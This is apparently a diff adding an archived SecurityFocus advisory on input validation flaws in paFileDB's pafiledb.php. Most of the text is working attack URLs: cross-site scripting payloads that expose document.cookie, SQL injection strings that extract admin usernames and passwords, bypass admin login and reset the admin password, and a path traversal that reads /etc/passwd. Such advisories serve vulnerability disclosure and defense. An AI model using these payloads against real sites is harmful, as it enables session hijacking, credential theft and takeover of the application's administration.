@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/13967/info
+
+paFileDB is prone to multiple input validation vulnerabilities. The following issues are reported:
+
+Multiple SQL injection issues exist in paFileDB.
+
+The impact of these issues will vary depending on features supported by the database implementation but may be limited due to the nature of affected queries.
+
+Multiple cross-site scripting issues are also reported when passing user-supplied arguments to the 'sortby', 'filelist', and 'pages' parameters of the 'pafiledb.php' script.
+
+Exploitation of these issues may allow for compromise of the software, session hijacking, or attacks against the underlying database.
+
+Finally, paFileDB is prone to a file disclosure vulnerability. The 'action' parameter of the 'pafiledb.php' script is affected by the vulnerability. 
+
+http://www.example.com/pafiledb.php?action=viewall&start=20&sortby=name%22
+%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+http://www.example.com/pafiledb.php?action=category&id=1&filelist=%22%3E%3C
+script%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+http://www.example.com/pafiledb.php?action=category&id=1&pages=%22%3E
+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+http://www.example.com/pafiledb.php?action=admin&login=do&formname=-99'%20UNION
+%20SELECT%20admin_id,%20admin_username,%20'6f1ed002ab5595859014ebf0951522d9',
+%20admin_email,%201%20FROM%20pafiledb_admin%20WHERE%20'1&formpass=blah&B1=
+%3E%3E+Log+In+%3C%3C&action=admin&login=do
+
+http://www.example.com/pafiledb.php?select=-99'%20UNION%20SELECT%200,admin_username,
+admin_password,0,0,0,0%20FROM%20pafiledb_admin%20WHERE%201/*&B1=%3E%3E+Edit+
+Category+%3C%3C&action=team&tm=category&category=edit&edit=form&menu1=%2F
+pafiledb%2Fpafiledb.php%3Faction%3Dteam%26tm%3Dcategory%26category%3Dedit
+
+http://www.example.com/pafiledb.php?id=-99'%20UNION%20SELECT%200,admin_username,
+admin_password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20pafiledb_admin%20WHERE%
+201/*&B1=%3E%3E+Edit+File+%3C%3C&action=team&tm=file&file=edit&edit=form&menu1
+=%2Fpafiledb%2Fpafiledb.php%3Faction%3Dteam%26tm%3Dfile%26file%3Dedit
+
+http://www.example.com/pafiledb.php?action=team&tm=file&file=edit&id=1&edit=do&
+query=UPDATE%20pafiledb_admin%20SET%20admin_password%20=%20MD5%281337%28%
+20WHERE%201/*
+
+http://www.example.com/pafiledb.php?action=../../../../etc/passwd%00&login=do 
